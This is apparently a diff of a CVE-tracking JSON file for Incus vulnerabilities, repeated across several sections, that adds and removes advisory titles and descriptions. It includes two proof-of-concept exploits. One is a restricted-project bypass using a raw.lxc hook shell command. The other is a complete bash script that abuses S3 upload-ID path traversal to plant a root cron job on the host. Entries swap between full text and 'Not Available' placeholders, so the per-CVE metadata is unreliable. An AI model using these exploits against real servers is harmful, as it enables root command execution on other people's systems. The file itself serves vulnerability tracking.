@@ -264,8 +264,8 @@
             },
             "CVE-2026-47753": {
                 "cve_id": "CVE-2026-47753",
-                "title": "Title Not Available",
-                "description": "Description Not Available",
+                "title": "Incus has a Nil-Pointer Dereference Panic via Instance Backup Import (volume omitted) in github.com/lxc/incus",
+                "description": "Incus has a Nil-Pointer Dereference Panic via Instance Backup Import (volume omitted) in github.com/lxc/incus",
                 "severity": "MEDIUM",
                 "status": "fixed",
                 "events": [
@@ -290,8 +290,8 @@
             },
             "CVE-2026-48750": {
                 "cve_id": "CVE-2026-48750",
-                "title": "Incus has an arbitrary file write on host via `exec-output` symlink in crafted image in github.com/lxc/incus",
-                "description": "Incus has an arbitrary file write on host via `exec-output` symlink in crafted image in github.com/lxc/incus",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "CRITICAL",
                 "status": "fixed",
                 "events": [
@@ -303,8 +303,8 @@
             },
             "CVE-2026-48751": {
                 "cve_id": "CVE-2026-48751",
-                "title": "Incus has a restricted project bypass leading to arbitrary command execution in github.com/lxc/incus",
-                "description": "Incus has a restricted project bypass leading to arbitrary command execution in github.com/lxc/incus",
+                "title": "Incus has a restricted project bypass leading to arbitrary command execution",
+                "description": "### Summary\n\nInstance snapshots ignore the `restricted.containers.lowlevel=block` setting; allowing for arbitrary command execution on the Incus server by abusing lowlevel hooks such as `raw.lxc` and `raw.qemu`.\n\n\n### Details\n\nInstance snapshots ignore the `restricted.containers.lowlevel=block` setting; allowing for arbitrary command execution on the Incus server by abusing lowlevel hooks such as `raw.lxc` and `raw.qemu`.\n\nAs snapshots can be moved from one server to another, a malicious instance+snapshot can be crafted locally, moved to a restricted project and the snapshot restored for arbitrary command execution.\n\nIn practice, this allows a malicious actor to execute arbitrary commands on the host with root privileges.\n\n\n### PoC\n\n```\n# remote, restricted\nincus project set rem:project restricted.true\nincus project set rem:project restricted.containers.lowlevel=block\n\n# locally, unrestricted project\nincus init images:debian/trixie rce-raw-lxc\nincus config set rce-raw-lxc raw.lxc='lxc.hook.pre-start = /bin/sh -c \"/bin/id >/lxc-hook-prestart\"'\nincus snapshot create rce-raw-lxc snap0\n#> allow transfer to restricted project\nincus config unset rce-raw-lxc raw.lxc\n\n# locally, transfer and trigger\nincus move rce-raw-lxc rem: --mode push\nincus snapshot restore rem:rce-raw-lxc snap0\nincus start rem:rce-raw-lxc\n```\n\n\n### Impact\n\n- Bypass of project restrictions.\n- Arbitrary command execution on the Incus server.",
                 "severity": "CRITICAL",
                 "status": "fixed",
                 "events": [
@@ -329,8 +329,8 @@
             },
             "CVE-2026-48753": {
                 "cve_id": "CVE-2026-48753",
-                "title": "Incus has an arbitrary file write via path traversal in S3 multipart upload",
-                "description": "## Summary\n\nThe S3 protocol upload endpoint is vulnerable to path traversal and allows creation of arbitrary files on the host. This behavior could lead to arbitrary command execution.\n\nIn `internal/server/storage/s3/local/multipart.go`, user-controlled upload ID is appended to the uploads directory unsanitized; https://github.com/lxc/incus/blob/40dd4f151d52c06b178482aa2518abfb9df3e6fb/internal/server/storage/s3/local/multipart.go#L33\n\n## PoC\n\n### Setup\n\n```\n# Expose the S3 API and create a bucket\nincus config set core.storage_buckets_address=:8555\nincus storage volume create default bucket\n#> note the credentials\n```\n\n### Exploitation\n\nThe below script was mostly generated.\n\n```\n#!/usr/bin/env bash\nset -euo pipefail\n\nif [ $# -lt 4 ]; then\n\tprintf 'usage: $0 endpoint bucket access-key secret-key\\n' >&2\n\texit 1\nfi\n\nendpoint=\"${1%/}\"\nbucket=\"${2}\"\naccess=\"${3}\"\nsecret=\"${4}\"\n\nregion=\"us-east-1\"\nservice=\"s3\"\nkey=\"anything\"\npart=\"1\"\nupload_id=\"../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/cron.d\"\ntarget=\"/etc/cron.d/part-00001\"\ncmd=\"id > /incus-s3-uploadid-bash-rce; rm -f $target\"\nbody=\"* * * * * root /bin/sh -c '$cmd'\n\"\n\nuri_path=\"$(printf '%s' \"$endpoint\" | sed -E 's#^[a-z]+://[^/]+##')/$bucket/$key\"\nuri_path=\"${uri_path#/}\"\nuri_path=\"/$uri_path\"\nhost=\"$(printf '%s' \"$endpoint\" | sed -E 's#^[a-z]+://([^/]+).*#\\1#')\"\nqs=\"partNumber=$part&uploadId=${upload_id//\\//%2F}\"\nurl=\"$endpoint/$bucket/$key?$qs\"\n\namz_date=$(date -u +%Y%m%dT%H%M%SZ)\ndate_scope=\"${amz_date:0:8}\"\nscope=\"$date_scope/$region/$service/aws4_request\"\nbody_hash=$(printf '%s' \"$body\" | sha256sum | awk '{print $1}')\nsigned=\"host;x-amz-content-sha256;x-amz-date\"\n\ncanonical=\"PUT\n$uri_path\n$qs\nhost:$host\nx-amz-content-sha256:$body_hash\nx-amz-date:$amz_date\n\n$signed\n$body_hash\"\ncanonical_hash=\"$(printf '%s' \"$canonical\" | sha256sum | awk '{print $1}')\"\nstring_to_sign=\"AWS4-HMAC-SHA256\n$amz_date\n$scope\n$canonical_hash\"\n\nhmac_hex() {\n\tprintf '%s' \"${2}\" | openssl dgst -sha256 -mac HMAC -macopt \"hexkey:${1}\" -binary | xxd -p -c 256\n}\n\nk_date=$(printf 'AWS4%s' \"$secret\" | xxd -p -c 256)\nk_date=$(hmac_hex \"$k_date\" \"$date_scope\")\nk_region=$(hmac_hex \"$k_date\" \"$region\")\nk_service=$(hmac_hex \"$k_region\" \"$service\")\nk_signing=$(hmac_hex \"$k_service\" \"aws4_request\")\nsig=$(hmac_hex \"$k_signing\" \"$string_to_sign\")\nauth=\"AWS4-HMAC-SHA256 Credential=${access}/${scope},SignedHeaders=${signed},Signature=${sig}\"\n\nprintf '# body:\\n%s' \"${body}\"\n\ncurl -ksS -X PUT \"${url}\" \\\n\t-H \"Host: ${host}\" \\\n\t-H \"X-Amz-Date: ${amz_date}\" \\\n\t-H \"X-Amz-Content-Sha256: ${body_hash}\" \\\n\t-H \"Authorization: ${auth}\" \\\n\t--data-binary \"${body}\"\n```\n\n\n## Impact\n\nArbitrary file write on the host. Possibly leading to arbitrary command execution.",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "CRITICAL",
                 "status": "fixed",
                 "events": [
@@ -342,8 +342,8 @@
             },
             "CVE-2026-48754": {
                 "cve_id": "CVE-2026-48754",
-                "title": "Title Not Available",
-                "description": "Description Not Available",
+                "title": "Incus: Nil-pointer dereference in createDependentVolumesFromBackup\u00a0on disk.{Volume,VolumeSnapshots,Pool} in github.com/lxc/incus",
+                "description": "Incus: Nil-pointer dereference in createDependentVolumesFromBackup\u00a0on disk.{Volume,VolumeSnapshots,Pool} in github.com/lxc/incus",
                 "severity": "LOW",
                 "status": "fixed",
                 "events": [
@@ -355,8 +355,8 @@
             },
             "CVE-2026-48755": {
                 "cve_id": "CVE-2026-48755",
-                "title": "Incus has an argument injection in backup compression algorithm leading to AFW and ACE in github.com/lxc/incus",
-                "description": "Incus has an argument injection in backup compression algorithm leading to AFW and ACE in github.com/lxc/incus",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "CRITICAL",
                 "status": "fixed",
                 "events": [
@@ -368,8 +368,8 @@
             },
             "CVE-2026-48756": {
                 "cve_id": "CVE-2026-48756",
-                "title": "Incus: CreateCustomVolumeFromBackup nil-pointer dereference on volume_snapshots[*].expires_at (sibling-field variant of GHSA-r7w7) in github.com/lxc/incus",
-                "description": "Incus: CreateCustomVolumeFromBackup nil-pointer dereference on volume_snapshots[*].expires_at (sibling-field variant of GHSA-r7w7) in github.com/lxc/incus",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "LOW",
                 "status": "fixed",
                 "events": [
@@ -682,8 +682,8 @@
             },
             "CVE-2026-47753": {
                 "cve_id": "CVE-2026-47753",
-                "title": "Title Not Available",
-                "description": "Description Not Available",
+                "title": "Incus has a Nil-Pointer Dereference Panic via Instance Backup Import (volume omitted) in github.com/lxc/incus",
+                "description": "Incus has a Nil-Pointer Dereference Panic via Instance Backup Import (volume omitted) in github.com/lxc/incus",
                 "severity": "MEDIUM",
                 "status": "fixed",
                 "events": [
@@ -708,8 +708,8 @@
             },
             "CVE-2026-48750": {
                 "cve_id": "CVE-2026-48750",
-                "title": "Incus has an arbitrary file write on host via `exec-output` symlink in crafted image in github.com/lxc/incus",
-                "description": "Incus has an arbitrary file write on host via `exec-output` symlink in crafted image in github.com/lxc/incus",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "CRITICAL",
                 "status": "fixed",
                 "events": [
@@ -721,8 +721,8 @@
             },
             "CVE-2026-48751": {
                 "cve_id": "CVE-2026-48751",
-                "title": "Incus has a restricted project bypass leading to arbitrary command execution in github.com/lxc/incus",
-                "description": "Incus has a restricted project bypass leading to arbitrary command execution in github.com/lxc/incus",
+                "title": "Incus has a restricted project bypass leading to arbitrary command execution",
+                "description": "### Summary\n\nInstance snapshots ignore the `restricted.containers.lowlevel=block` setting; allowing for arbitrary command execution on the Incus server by abusing lowlevel hooks such as `raw.lxc` and `raw.qemu`.\n\n\n### Details\n\nInstance snapshots ignore the `restricted.containers.lowlevel=block` setting; allowing for arbitrary command execution on the Incus server by abusing lowlevel hooks such as `raw.lxc` and `raw.qemu`.\n\nAs snapshots can be moved from one server to another, a malicious instance+snapshot can be crafted locally, moved to a restricted project and the snapshot restored for arbitrary command execution.\n\nIn practice, this allows a malicious actor to execute arbitrary commands on the host with root privileges.\n\n\n### PoC\n\n```\n# remote, restricted\nincus project set rem:project restricted.true\nincus project set rem:project restricted.containers.lowlevel=block\n\n# locally, unrestricted project\nincus init images:debian/trixie rce-raw-lxc\nincus config set rce-raw-lxc raw.lxc='lxc.hook.pre-start = /bin/sh -c \"/bin/id >/lxc-hook-prestart\"'\nincus snapshot create rce-raw-lxc snap0\n#> allow transfer to restricted project\nincus config unset rce-raw-lxc raw.lxc\n\n# locally, transfer and trigger\nincus move rce-raw-lxc rem: --mode push\nincus snapshot restore rem:rce-raw-lxc snap0\nincus start rem:rce-raw-lxc\n```\n\n\n### Impact\n\n- Bypass of project restrictions.\n- Arbitrary command execution on the Incus server.",
                 "severity": "CRITICAL",
                 "status": "fixed",
                 "events": [
@@ -747,8 +747,8 @@
             },
             "CVE-2026-48753": {
                 "cve_id": "CVE-2026-48753",
-                "title": "Incus has an arbitrary file write via path traversal in S3 multipart upload",
-                "description": "## Summary\n\nThe S3 protocol upload endpoint is vulnerable to path traversal and allows creation of arbitrary files on the host. This behavior could lead to arbitrary command execution.\n\nIn `internal/server/storage/s3/local/multipart.go`, user-controlled upload ID is appended to the uploads directory unsanitized; https://github.com/lxc/incus/blob/40dd4f151d52c06b178482aa2518abfb9df3e6fb/internal/server/storage/s3/local/multipart.go#L33\n\n## PoC\n\n### Setup\n\n```\n# Expose the S3 API and create a bucket\nincus config set core.storage_buckets_address=:8555\nincus storage volume create default bucket\n#> note the credentials\n```\n\n### Exploitation\n\nThe below script was mostly generated.\n\n```\n#!/usr/bin/env bash\nset -euo pipefail\n\nif [ $# -lt 4 ]; then\n\tprintf 'usage: $0 endpoint bucket access-key secret-key\\n' >&2\n\texit 1\nfi\n\nendpoint=\"${1%/}\"\nbucket=\"${2}\"\naccess=\"${3}\"\nsecret=\"${4}\"\n\nregion=\"us-east-1\"\nservice=\"s3\"\nkey=\"anything\"\npart=\"1\"\nupload_id=\"../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/cron.d\"\ntarget=\"/etc/cron.d/part-00001\"\ncmd=\"id > /incus-s3-uploadid-bash-rce; rm -f $target\"\nbody=\"* * * * * root /bin/sh -c '$cmd'\n\"\n\nuri_path=\"$(printf '%s' \"$endpoint\" | sed -E 's#^[a-z]+://[^/]+##')/$bucket/$key\"\nuri_path=\"${uri_path#/}\"\nuri_path=\"/$uri_path\"\nhost=\"$(printf '%s' \"$endpoint\" | sed -E 's#^[a-z]+://([^/]+).*#\\1#')\"\nqs=\"partNumber=$part&uploadId=${upload_id//\\//%2F}\"\nurl=\"$endpoint/$bucket/$key?$qs\"\n\namz_date=$(date -u +%Y%m%dT%H%M%SZ)\ndate_scope=\"${amz_date:0:8}\"\nscope=\"$date_scope/$region/$service/aws4_request\"\nbody_hash=$(printf '%s' \"$body\" | sha256sum | awk '{print $1}')\nsigned=\"host;x-amz-content-sha256;x-amz-date\"\n\ncanonical=\"PUT\n$uri_path\n$qs\nhost:$host\nx-amz-content-sha256:$body_hash\nx-amz-date:$amz_date\n\n$signed\n$body_hash\"\ncanonical_hash=\"$(printf '%s' \"$canonical\" | sha256sum | awk '{print $1}')\"\nstring_to_sign=\"AWS4-HMAC-SHA256\n$amz_date\n$scope\n$canonical_hash\"\n\nhmac_hex() {\n\tprintf '%s' \"${2}\" | openssl dgst -sha256 -mac HMAC -macopt \"hexkey:${1}\" -binary | xxd -p -c 256\n}\n\nk_date=$(printf 'AWS4%s' \"$secret\" | xxd -p -c 256)\nk_date=$(hmac_hex \"$k_date\" \"$date_scope\")\nk_region=$(hmac_hex \"$k_date\" \"$region\")\nk_service=$(hmac_hex \"$k_region\" \"$service\")\nk_signing=$(hmac_hex \"$k_service\" \"aws4_request\")\nsig=$(hmac_hex \"$k_signing\" \"$string_to_sign\")\nauth=\"AWS4-HMAC-SHA256 Credential=${access}/${scope},SignedHeaders=${signed},Signature=${sig}\"\n\nprintf '# body:\\n%s' \"${body}\"\n\ncurl -ksS -X PUT \"${url}\" \\\n\t-H \"Host: ${host}\" \\\n\t-H \"X-Amz-Date: ${amz_date}\" \\\n\t-H \"X-Amz-Content-Sha256: ${body_hash}\" \\\n\t-H \"Authorization: ${auth}\" \\\n\t--data-binary \"${body}\"\n```\n\n\n## Impact\n\nArbitrary file write on the host. Possibly leading to arbitrary command execution.",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "CRITICAL",
                 "status": "fixed",
                 "events": [
@@ -760,8 +760,8 @@
             },
             "CVE-2026-48754": {
                 "cve_id": "CVE-2026-48754",
-                "title": "Title Not Available",
-                "description": "Description Not Available",
+                "title": "Incus: Nil-pointer dereference in createDependentVolumesFromBackup\u00a0on disk.{Volume,VolumeSnapshots,Pool} in github.com/lxc/incus",
+                "description": "Incus: Nil-pointer dereference in createDependentVolumesFromBackup\u00a0on disk.{Volume,VolumeSnapshots,Pool} in github.com/lxc/incus",
                 "severity": "LOW",
                 "status": "fixed",
                 "events": [
@@ -773,8 +773,8 @@
             },
             "CVE-2026-48755": {
                 "cve_id": "CVE-2026-48755",
-                "title": "Incus has an argument injection in backup compression algorithm leading to AFW and ACE in github.com/lxc/incus",
-                "description": "Incus has an argument injection in backup compression algorithm leading to AFW and ACE in github.com/lxc/incus",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "CRITICAL",
                 "status": "fixed",
                 "events": [
@@ -786,8 +786,8 @@
             },
             "CVE-2026-48756": {
                 "cve_id": "CVE-2026-48756",
-                "title": "Incus: CreateCustomVolumeFromBackup nil-pointer dereference on volume_snapshots[*].expires_at (sibling-field variant of GHSA-r7w7) in github.com/lxc/incus",
-                "description": "Incus: CreateCustomVolumeFromBackup nil-pointer dereference on volume_snapshots[*].expires_at (sibling-field variant of GHSA-r7w7) in github.com/lxc/incus",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "LOW",
                 "status": "fixed",
                 "events": [
@@ -1100,8 +1100,8 @@
             },
             "CVE-2026-47753": {
                 "cve_id": "CVE-2026-47753",
-                "title": "Title Not Available",
-                "description": "Description Not Available",
+                "title": "Incus has a Nil-Pointer Dereference Panic via Instance Backup Import (volume omitted) in github.com/lxc/incus",
+                "description": "Incus has a Nil-Pointer Dereference Panic via Instance Backup Import (volume omitted) in github.com/lxc/incus",
                 "severity": "MEDIUM",
                 "status": "fixed",
                 "events": [
@@ -1126,8 +1126,8 @@
             },
             "CVE-2026-48750": {
                 "cve_id": "CVE-2026-48750",
-                "title": "Incus has an arbitrary file write on host via `exec-output` symlink in crafted image in github.com/lxc/incus",
-                "description": "Incus has an arbitrary file write on host via `exec-output` symlink in crafted image in github.com/lxc/incus",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "CRITICAL",
                 "status": "fixed",
                 "events": [
@@ -1139,8 +1139,8 @@
             },
             "CVE-2026-48751": {
                 "cve_id": "CVE-2026-48751",
-                "title": "Incus has a restricted project bypass leading to arbitrary command execution in github.com/lxc/incus",
-                "description": "Incus has a restricted project bypass leading to arbitrary command execution in github.com/lxc/incus",
+                "title": "Incus has a restricted project bypass leading to arbitrary command execution",
+                "description": "### Summary\n\nInstance snapshots ignore the `restricted.containers.lowlevel=block` setting; allowing for arbitrary command execution on the Incus server by abusing lowlevel hooks such as `raw.lxc` and `raw.qemu`.\n\n\n### Details\n\nInstance snapshots ignore the `restricted.containers.lowlevel=block` setting; allowing for arbitrary command execution on the Incus server by abusing lowlevel hooks such as `raw.lxc` and `raw.qemu`.\n\nAs snapshots can be moved from one server to another, a malicious instance+snapshot can be crafted locally, moved to a restricted project and the snapshot restored for arbitrary command execution.\n\nIn practice, this allows a malicious actor to execute arbitrary commands on the host with root privileges.\n\n\n### PoC\n\n```\n# remote, restricted\nincus project set rem:project restricted.true\nincus project set rem:project restricted.containers.lowlevel=block\n\n# locally, unrestricted project\nincus init images:debian/trixie rce-raw-lxc\nincus config set rce-raw-lxc raw.lxc='lxc.hook.pre-start = /bin/sh -c \"/bin/id >/lxc-hook-prestart\"'\nincus snapshot create rce-raw-lxc snap0\n#> allow transfer to restricted project\nincus config unset rce-raw-lxc raw.lxc\n\n# locally, transfer and trigger\nincus move rce-raw-lxc rem: --mode push\nincus snapshot restore rem:rce-raw-lxc snap0\nincus start rem:rce-raw-lxc\n```\n\n\n### Impact\n\n- Bypass of project restrictions.\n- Arbitrary command execution on the Incus server.",
                 "severity": "CRITICAL",
                 "status": "fixed",
                 "events": [
@@ -1165,8 +1165,8 @@
             },
             "CVE-2026-48753": {
                 "cve_id": "CVE-2026-48753",
-                "title": "Incus has an arbitrary file write via path traversal in S3 multipart upload",
-                "description": "## Summary\n\nThe S3 protocol upload endpoint is vulnerable to path traversal and allows creation of arbitrary files on the host. This behavior could lead to arbitrary command execution.\n\nIn `internal/server/storage/s3/local/multipart.go`, user-controlled upload ID is appended to the uploads directory unsanitized; https://github.com/lxc/incus/blob/40dd4f151d52c06b178482aa2518abfb9df3e6fb/internal/server/storage/s3/local/multipart.go#L33\n\n## PoC\n\n### Setup\n\n```\n# Expose the S3 API and create a bucket\nincus config set core.storage_buckets_address=:8555\nincus storage volume create default bucket\n#> note the credentials\n```\n\n### Exploitation\n\nThe below script was mostly generated.\n\n```\n#!/usr/bin/env bash\nset -euo pipefail\n\nif [ $# -lt 4 ]; then\n\tprintf 'usage: $0 endpoint bucket access-key secret-key\\n' >&2\n\texit 1\nfi\n\nendpoint=\"${1%/}\"\nbucket=\"${2}\"\naccess=\"${3}\"\nsecret=\"${4}\"\n\nregion=\"us-east-1\"\nservice=\"s3\"\nkey=\"anything\"\npart=\"1\"\nupload_id=\"../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/cron.d\"\ntarget=\"/etc/cron.d/part-00001\"\ncmd=\"id > /incus-s3-uploadid-bash-rce; rm -f $target\"\nbody=\"* * * * * root /bin/sh -c '$cmd'\n\"\n\nuri_path=\"$(printf '%s' \"$endpoint\" | sed -E 's#^[a-z]+://[^/]+##')/$bucket/$key\"\nuri_path=\"${uri_path#/}\"\nuri_path=\"/$uri_path\"\nhost=\"$(printf '%s' \"$endpoint\" | sed -E 's#^[a-z]+://([^/]+).*#\\1#')\"\nqs=\"partNumber=$part&uploadId=${upload_id//\\//%2F}\"\nurl=\"$endpoint/$bucket/$key?$qs\"\n\namz_date=$(date -u +%Y%m%dT%H%M%SZ)\ndate_scope=\"${amz_date:0:8}\"\nscope=\"$date_scope/$region/$service/aws4_request\"\nbody_hash=$(printf '%s' \"$body\" | sha256sum | awk '{print $1}')\nsigned=\"host;x-amz-content-sha256;x-amz-date\"\n\ncanonical=\"PUT\n$uri_path\n$qs\nhost:$host\nx-amz-content-sha256:$body_hash\nx-amz-date:$amz_date\n\n$signed\n$body_hash\"\ncanonical_hash=\"$(printf '%s' \"$canonical\" | sha256sum | awk '{print $1}')\"\nstring_to_sign=\"AWS4-HMAC-SHA256\n$amz_date\n$scope\n$canonical_hash\"\n\nhmac_hex() {\n\tprintf '%s' \"${2}\" | openssl dgst -sha256 -mac HMAC -macopt \"hexkey:${1}\" -binary | xxd -p -c 256\n}\n\nk_date=$(printf 'AWS4%s' \"$secret\" | xxd -p -c 256)\nk_date=$(hmac_hex \"$k_date\" \"$date_scope\")\nk_region=$(hmac_hex \"$k_date\" \"$region\")\nk_service=$(hmac_hex \"$k_region\" \"$service\")\nk_signing=$(hmac_hex \"$k_service\" \"aws4_request\")\nsig=$(hmac_hex \"$k_signing\" \"$string_to_sign\")\nauth=\"AWS4-HMAC-SHA256 Credential=${access}/${scope},SignedHeaders=${signed},Signature=${sig}\"\n\nprintf '# body:\\n%s' \"${body}\"\n\ncurl -ksS -X PUT \"${url}\" \\\n\t-H \"Host: ${host}\" \\\n\t-H \"X-Amz-Date: ${amz_date}\" \\\n\t-H \"X-Amz-Content-Sha256: ${body_hash}\" \\\n\t-H \"Authorization: ${auth}\" \\\n\t--data-binary \"${body}\"\n```\n\n\n## Impact\n\nArbitrary file write on the host. Possibly leading to arbitrary command execution.",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "CRITICAL",
                 "status": "fixed",
                 "events": [
@@ -1178,8 +1178,8 @@
             },
             "CVE-2026-48754": {
                 "cve_id": "CVE-2026-48754",
-                "title": "Title Not Available",
-                "description": "Description Not Available",
+                "title": "Incus: Nil-pointer dereference in createDependentVolumesFromBackup\u00a0on disk.{Volume,VolumeSnapshots,Pool} in github.com/lxc/incus",
+                "description": "Incus: Nil-pointer dereference in createDependentVolumesFromBackup\u00a0on disk.{Volume,VolumeSnapshots,Pool} in github.com/lxc/incus",
                 "severity": "LOW",
                 "status": "fixed",
                 "events": [
@@ -1191,8 +1191,8 @@
             },
             "CVE-2026-48755": {
                 "cve_id": "CVE-2026-48755",
-                "title": "Incus has an argument injection in backup compression algorithm leading to AFW and ACE in github.com/lxc/incus",
-                "description": "Incus has an argument injection in backup compression algorithm leading to AFW and ACE in github.com/lxc/incus",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "CRITICAL",
                 "status": "fixed",
                 "events": [
@@ -1204,8 +1204,8 @@
             },
             "CVE-2026-48756": {
                 "cve_id": "CVE-2026-48756",
-                "title": "Incus: CreateCustomVolumeFromBackup nil-pointer dereference on volume_snapshots[*].expires_at (sibling-field variant of GHSA-r7w7) in github.com/lxc/incus",
-                "description": "Incus: CreateCustomVolumeFromBackup nil-pointer dereference on volume_snapshots[*].expires_at (sibling-field variant of GHSA-r7w7) in github.com/lxc/incus",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "LOW",
                 "status": "fixed",
                 "events": [
@@ -1518,8 +1518,8 @@
             },
             "CVE-2026-47753": {
                 "cve_id": "CVE-2026-47753",
-                "title": "Title Not Available",
-                "description": "Description Not Available",
+                "title": "Incus has a Nil-Pointer Dereference Panic via Instance Backup Import (volume omitted) in github.com/lxc/incus",
+                "description": "Incus has a Nil-Pointer Dereference Panic via Instance Backup Import (volume omitted) in github.com/lxc/incus",
                 "severity": "MEDIUM",
                 "status": "fixed",
                 "events": [
@@ -1544,8 +1544,8 @@
             },
             "CVE-2026-48750": {
                 "cve_id": "CVE-2026-48750",
-                "title": "Incus has an arbitrary file write on host via `exec-output` symlink in crafted image in github.com/lxc/incus",
-                "description": "Incus has an arbitrary file write on host via `exec-output` symlink in crafted image in github.com/lxc/incus",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "CRITICAL",
                 "status": "fixed",
                 "events": [
@@ -1557,8 +1557,8 @@
             },
             "CVE-2026-48751": {
                 "cve_id": "CVE-2026-48751",
-                "title": "Incus has a restricted project bypass leading to arbitrary command execution in github.com/lxc/incus",
-                "description": "Incus has a restricted project bypass leading to arbitrary command execution in github.com/lxc/incus",
+                "title": "Incus has a restricted project bypass leading to arbitrary command execution",
+                "description": "### Summary\n\nInstance snapshots ignore the `restricted.containers.lowlevel=block` setting; allowing for arbitrary command execution on the Incus server by abusing lowlevel hooks such as `raw.lxc` and `raw.qemu`.\n\n\n### Details\n\nInstance snapshots ignore the `restricted.containers.lowlevel=block` setting; allowing for arbitrary command execution on the Incus server by abusing lowlevel hooks such as `raw.lxc` and `raw.qemu`.\n\nAs snapshots can be moved from one server to another, a malicious instance+snapshot can be crafted locally, moved to a restricted project and the snapshot restored for arbitrary command execution.\n\nIn practice, this allows a malicious actor to execute arbitrary commands on the host with root privileges.\n\n\n### PoC\n\n```\n# remote, restricted\nincus project set rem:project restricted.true\nincus project set rem:project restricted.containers.lowlevel=block\n\n# locally, unrestricted project\nincus init images:debian/trixie rce-raw-lxc\nincus config set rce-raw-lxc raw.lxc='lxc.hook.pre-start = /bin/sh -c \"/bin/id >/lxc-hook-prestart\"'\nincus snapshot create rce-raw-lxc snap0\n#> allow transfer to restricted project\nincus config unset rce-raw-lxc raw.lxc\n\n# locally, transfer and trigger\nincus move rce-raw-lxc rem: --mode push\nincus snapshot restore rem:rce-raw-lxc snap0\nincus start rem:rce-raw-lxc\n```\n\n\n### Impact\n\n- Bypass of project restrictions.\n- Arbitrary command execution on the Incus server.",
                 "severity": "CRITICAL",
                 "status": "fixed",
                 "events": [
@@ -1583,8 +1583,8 @@
             },
             "CVE-2026-48753": {
                 "cve_id": "CVE-2026-48753",
-                "title": "Incus has an arbitrary file write via path traversal in S3 multipart upload",
-                "description": "## Summary\n\nThe S3 protocol upload endpoint is vulnerable to path traversal and allows creation of arbitrary files on the host. This behavior could lead to arbitrary command execution.\n\nIn `internal/server/storage/s3/local/multipart.go`, user-controlled upload ID is appended to the uploads directory unsanitized; https://github.com/lxc/incus/blob/40dd4f151d52c06b178482aa2518abfb9df3e6fb/internal/server/storage/s3/local/multipart.go#L33\n\n## PoC\n\n### Setup\n\n```\n# Expose the S3 API and create a bucket\nincus config set core.storage_buckets_address=:8555\nincus storage volume create default bucket\n#> note the credentials\n```\n\n### Exploitation\n\nThe below script was mostly generated.\n\n```\n#!/usr/bin/env bash\nset -euo pipefail\n\nif [ $# -lt 4 ]; then\n\tprintf 'usage: $0 endpoint bucket access-key secret-key\\n' >&2\n\texit 1\nfi\n\nendpoint=\"${1%/}\"\nbucket=\"${2}\"\naccess=\"${3}\"\nsecret=\"${4}\"\n\nregion=\"us-east-1\"\nservice=\"s3\"\nkey=\"anything\"\npart=\"1\"\nupload_id=\"../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/cron.d\"\ntarget=\"/etc/cron.d/part-00001\"\ncmd=\"id > /incus-s3-uploadid-bash-rce; rm -f $target\"\nbody=\"* * * * * root /bin/sh -c '$cmd'\n\"\n\nuri_path=\"$(printf '%s' \"$endpoint\" | sed -E 's#^[a-z]+://[^/]+##')/$bucket/$key\"\nuri_path=\"${uri_path#/}\"\nuri_path=\"/$uri_path\"\nhost=\"$(printf '%s' \"$endpoint\" | sed -E 's#^[a-z]+://([^/]+).*#\\1#')\"\nqs=\"partNumber=$part&uploadId=${upload_id//\\//%2F}\"\nurl=\"$endpoint/$bucket/$key?$qs\"\n\namz_date=$(date -u +%Y%m%dT%H%M%SZ)\ndate_scope=\"${amz_date:0:8}\"\nscope=\"$date_scope/$region/$service/aws4_request\"\nbody_hash=$(printf '%s' \"$body\" | sha256sum | awk '{print $1}')\nsigned=\"host;x-amz-content-sha256;x-amz-date\"\n\ncanonical=\"PUT\n$uri_path\n$qs\nhost:$host\nx-amz-content-sha256:$body_hash\nx-amz-date:$amz_date\n\n$signed\n$body_hash\"\ncanonical_hash=\"$(printf '%s' \"$canonical\" | sha256sum | awk '{print $1}')\"\nstring_to_sign=\"AWS4-HMAC-SHA256\n$amz_date\n$scope\n$canonical_hash\"\n\nhmac_hex() {\n\tprintf '%s' \"${2}\" | openssl dgst -sha256 -mac HMAC -macopt \"hexkey:${1}\" -binary | xxd -p -c 256\n}\n\nk_date=$(printf 'AWS4%s' \"$secret\" | xxd -p -c 256)\nk_date=$(hmac_hex \"$k_date\" \"$date_scope\")\nk_region=$(hmac_hex \"$k_date\" \"$region\")\nk_service=$(hmac_hex \"$k_region\" \"$service\")\nk_signing=$(hmac_hex \"$k_service\" \"aws4_request\")\nsig=$(hmac_hex \"$k_signing\" \"$string_to_sign\")\nauth=\"AWS4-HMAC-SHA256 Credential=${access}/${scope},SignedHeaders=${signed},Signature=${sig}\"\n\nprintf '# body:\\n%s' \"${body}\"\n\ncurl -ksS -X PUT \"${url}\" \\\n\t-H \"Host: ${host}\" \\\n\t-H \"X-Amz-Date: ${amz_date}\" \\\n\t-H \"X-Amz-Content-Sha256: ${body_hash}\" \\\n\t-H \"Authorization: ${auth}\" \\\n\t--data-binary \"${body}\"\n```\n\n\n## Impact\n\nArbitrary file write on the host. Possibly leading to arbitrary command execution.",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "CRITICAL",
                 "status": "fixed",
                 "events": [
@@ -1596,8 +1596,8 @@
             },
             "CVE-2026-48754": {
                 "cve_id": "CVE-2026-48754",
-                "title": "Title Not Available",
-                "description": "Description Not Available",
+                "title": "Incus: Nil-pointer dereference in createDependentVolumesFromBackup\u00a0on disk.{Volume,VolumeSnapshots,Pool} in github.com/lxc/incus",
